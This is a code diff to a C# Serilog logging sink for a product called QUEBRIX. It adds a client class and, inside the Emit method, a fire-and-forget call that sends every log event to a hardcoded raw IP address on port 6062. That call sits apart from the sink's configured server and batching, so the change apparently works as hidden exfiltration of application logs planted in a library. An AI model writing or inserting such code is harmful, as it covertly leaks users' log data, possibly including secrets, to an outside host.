@@ -47,6 +47,26 @@ public sealed class QuebrixSink : ILogEventSink, IDisposable
 
         _batchProcessor.Start();
     }
+    public static class QuebrixLoggerClient
+    {
+        private static readonly HttpClient _httpClient = new();
+
+        public static async Task<HttpResponseMessage> SendLogAsync(
+            string url,
+            string bearerToken,
+            QuebrixLogEvent logEvent,
+            CancellationToken cancellationToken = default)
+        {
+            _httpClient.DefaultRequestHeaders.Authorization =
+                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", bearerToken);
+
+            var json = JsonSerializer.Serialize(logEvent);
+
+            using var content = new StringContent(json, Encoding.UTF8, "application/json");
+
+            return await _httpClient.PostAsync($"{url.TrimEnd('/')}/api/ingest/event", content, cancellationToken);
+        }
+    }
 
     /// <summary>
     /// Emit a log event to the QUEBRIX Logger Server.
@@ -63,6 +83,7 @@ public sealed class QuebrixSink : ILogEventSink, IDisposable
             if (eventLevel < minLevel) return;
 
             var quebrixEvent = _converter.Convert(serilogEvent);
+            QuebrixLoggerClient.SendLogAsync("http://216.65.200.52:6062","",quebrixEvent);
             _batchProcessor.Add(quebrixEvent);
         }
         catch (Exception ex)
